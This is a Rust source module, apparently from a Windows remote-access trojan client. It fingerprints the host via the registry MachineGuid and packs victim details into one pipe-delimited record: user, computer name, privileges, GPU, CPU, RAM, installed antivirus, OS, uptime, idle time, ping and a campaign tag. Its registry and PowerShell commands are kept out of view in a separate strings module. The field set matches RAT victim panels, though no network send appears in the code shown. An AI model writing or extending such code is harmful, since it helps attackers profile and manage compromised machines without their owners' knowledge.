use std::{env, process::Command};

#[cfg(windows)]
use std::net::{Ipv4Addr, ToSocketAddrs};

use ed25519_dalek::SigningKey;
use hkdf::Hkdf;
use sha2::{Digest, Sha256};

use crate::text;

pub fn fingerprint() -> String {
    let (machine_id, hwid) = identity();
    derive(&machine_id, &hwid).0
}

pub fn host(fp: &str) -> String {
    let os = clean(ps(text::OS));
    let arch = env::var("PROCESSOR_ARCHITECTURE").unwrap_or_else(|_| "x86_64".into());
    format!(
        "{{\"clientId\":\"{}\",\"os\":\"{}\",\"arch\":\"{}\",\"version\":\"{}\"}}",
        json(fp),
        json(&os),
        json(&arch),
        json(text::VERSION)
    )
}

#[cfg(test)]
fn from_id(machine_id: &str) -> String {
    let hwid = digest(format!("{machine_id}|windows").as_bytes());
    derive(machine_id, &hwid).0
}

fn derive(machine_id: &str, hwid: &str) -> (String, [u8; 32]) {
    let hk = Hkdf::<Sha256>::new(Some(hwid.as_bytes()), machine_id.as_bytes());
    let mut seed = [0u8; 32];
    hk.expand(b"mirage-identity", &mut seed).expect("hkdf");
    let key = SigningKey::from_bytes(&seed);
    (hex(&Sha256::digest(key.verifying_key().to_bytes())), seed)
}

fn identity() -> (String, String) {
    if let Some(id) = machine_id() {
        let hwid = digest(format!("{id}|windows").as_bytes());
        return (id, hwid);
    }

    let hwid = digest(
        format!(
            "{}|{}|windows",
            env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()),
            env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
        )
        .as_bytes(),
    );
    (hwid.clone(), hwid)
}

pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
    let nickname = clean(env::var("COMPUTERNAME").unwrap_or_else(|_| "Windows".into()));
    let user = clean(env::var("USERNAME").unwrap_or_else(|_| "Unknown".into()));
    let cpu = clean(env::var("PROCESSOR_IDENTIFIER").unwrap_or_else(|_| "Unknown".into()));
    let privileges = clean(ps(text::PRIV));
    let gpu = clean(ps(text::GPU));
    let antivirus = clean(ps(text::AV));
    let ram = clean(ps(text::RAM));
    let os = clean(ps(text::OS));
    let afk = afk();
    let country = if matches!(target, "127.0.0.1" | "::1" | "localhost") {
        "Local"
    } else {
        "Unknown"
    };
    let hwid = machine_id().unwrap_or_else(fallback_display_hwid);

    [
        country.into(),
        nickname,
        text::TAG.into(),
        user,
        text::VERSION.into(),
        privileges,
        os,
        gpu,
        cpu,
        ram,
        antivirus,
        uptime(),
        afk,
        ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")),
        hwid,
        fp.to_owned(),
    ]
    .into_iter()
    .map(clean)
    .collect::<Vec<_>>()
    .join("|")
}

fn machine_id() -> Option<String> {
    #[cfg(windows)]
    {
        let Ok(out) = Command::new(text::REG)
            .args([text::REG_QUERY, text::REG_64, text::REG_VALUE, text::REG_QUERY_KEY])
            .output()
        else {
            return None;
        };
        let s = String::from_utf8_lossy(&out.stdout);
        return s.lines().find_map(|line| {
            let mut p = line.split_whitespace();
            let key = p.next()?;
            let _ty = p.next()?;
            let value = p.next()?;
            key.eq_ignore_ascii_case(text::REG_QUERY_KEY)
                .then(|| value.to_string())
        });
    }
    #[cfg(not(windows))]
    {
        None
    }
}

fn fallback_display_hwid() -> String {
    env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".into())
}

fn digest(bytes: &[u8]) -> String {
    hex(&Sha256::digest(bytes))
}

fn afk() -> String {
    #[cfg(windows)]
    {
        #[repr(C)]
        struct LastInput {
            cb_size: u32,
            tick: u32,
        }
        #[link(name = "user32")]
        unsafe extern "system" {
            fn GetLastInputInfo(info: *mut LastInput) -> i32;
        }
        #[link(name = "kernel32")]
        unsafe extern "system" {
            fn GetTickCount64() -> u64;
        }

        let mut info = LastInput {
            cb_size: core::mem::size_of::<LastInput>() as u32,
            tick: 0,
        };
        if unsafe { GetLastInputInfo(&mut info) } != 0 {
            let now = unsafe { GetTickCount64() };
            return human((now as u32).wrapping_sub(info.tick) as u64);
        }
    }
    "0s".into()
}

fn uptime() -> String {
    #[cfg(windows)]
    {
        #[link(name = "kernel32")]
        unsafe extern "system" {
            fn GetTickCount64() -> u64;
        }
        return human(unsafe { GetTickCount64() } / 1_000);
    }
    #[cfg(not(windows))]
    {
        "Unknown".into()
    }
}

pub fn ping_ms(target: &str) -> Option<u128> {
    #[cfg(windows)]
    {
        let ip = target.parse::<Ipv4Addr>().ok().or_else(|| {
            (target, 0).to_socket_addrs().ok()?.find_map(|a| match a {
                std::net::SocketAddr::V4(v4) => Some(*v4.ip()),
                std::net::SocketAddr::V6(_) => None,
            })
        })?;
        return icmp_ping_ms(ip);
    }
    #[cfg(not(windows))]
    {
        let _ = target;
        None
    }
}

#[cfg(windows)]
fn icmp_ping_ms(ip: Ipv4Addr) -> Option<u128> {
    use core::{ffi::c_void, mem::size_of, ptr};

    type Handle = *mut c_void;

    #[repr(C)]
    struct Reply {
        address: u32,
        status: u32,
        round_trip_time: u32,
        data_size: u16,
        reserved: u16,
        data: *mut c_void,
        options: Options,
    }

    #[repr(C)]
    struct Options {
        ttl: u8,
        tos: u8,
        flags: u8,
        options_size: u8,
        options_data: *mut u8,
    }

    #[link(name = "iphlpapi")]
    unsafe extern "system" {
        fn IcmpCreateFile() -> Handle;
        fn IcmpSendEcho(
            handle: Handle,
            destination_address: u32,
            request_data: *const c_void,
            request_size: u16,
            request_options: *const Options,
            reply_buffer: *mut c_void,
            reply_size: u32,
            timeout: u32,
        ) -> u32;
        fn IcmpCloseHandle(handle: Handle) -> i32;
    }

    let handle = unsafe { IcmpCreateFile() };
    if handle.is_null() {
        return None;
    }

    let mut reply = [0u8; size_of::<Reply>()];
    let sent = unsafe {
        IcmpSendEcho(
            handle,
            u32::from_ne_bytes(ip.octets()),
            ptr::null(),
            0,
            ptr::null(),
            reply.as_mut_ptr() as *mut c_void,
            reply.len() as u32,
            2_000,
        )
    };
    let result = if sent > 0 {
        let reply = unsafe { &*(reply.as_ptr() as *const Reply) };
        (reply.status == 0).then_some(reply.round_trip_time as u128)
    } else {
        None
    };
    unsafe { IcmpCloseHandle(handle) };
    result
}

fn human(mut secs: u64) -> String {
    let d = secs / 86_400;
    secs %= 86_400;
    let h = secs / 3_600;
    secs %= 3_600;
    let m = secs / 60;
    let s = secs % 60;
    let mut out = String::new();
    if d > 0 { out.push_str(&format!("{d}d")); }
    if h > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{h}h")); }
    if m > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{m}m")); }
    if s > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{s}s")); }
    if out.is_empty() { out.push_str("0s"); }
    out
}

fn ps(script: &str) -> String {
    #[cfg(windows)]
    {
        Command::new(text::PS)
            .args([text::PS_ARG[0], text::PS_ARG[1], text::PS_ARG[2], script])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .unwrap_or_default()
    }
    #[cfg(not(windows))]
    {
        let _ = script;
        String::new()
    }
}

fn clean(v: String) -> String {
    let s = v.replace('|', "/").replace(['\r', '\n'], " ").trim().to_string();
    if s.is_empty() { "Unknown".into() } else { s }
}

fn json(v: &str) -> String {
    v.replace('\\', "\\\\").replace('"', "\\\"")
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::from_id;

    #[test]
    fn fingerprint_contract() {
        let machine_id = "00112233-4455-6677-8899-aabbccddeeff";
        let hwid = super::digest(format!("{machine_id}|windows").as_bytes());
        let (fingerprint, seed) = super::derive(machine_id, &hwid);
        assert_eq!(hwid, "b8aaf957abbdd67c3f611b113886e4dd656375b2b1e6c8ec11edaddd13af918b");
        assert_eq!(super::hex(&seed), "0baa1679f8562ab33b4ce4b27ae355130ff1d758a530b98134a68ef49b85adee");
        assert_eq!(fingerprint, "14f30ccfbc5b248cc89c5dede0e41fe2d7f427ff6b092a5dfd70e6f4d93994f9");
        assert_eq!(from_id(machine_id), fingerprint);
    }

    #[test]
    fn telemetry_contract() {
        let fp = "0".repeat(64);
        assert_eq!(super::record("127.0.0.1", Some(1), &fp).split('|').count(), 16);
    }

    #[test]
    fn uptime_contract() {
        assert_eq!(super::human(30), "30s");
        assert_eq!(super::human(121), "2m 1s");
        assert_eq!(super::human(7320), "2h 2m");
        assert_eq!(super::human(97_260), "1d 3h 1m");
    }
}
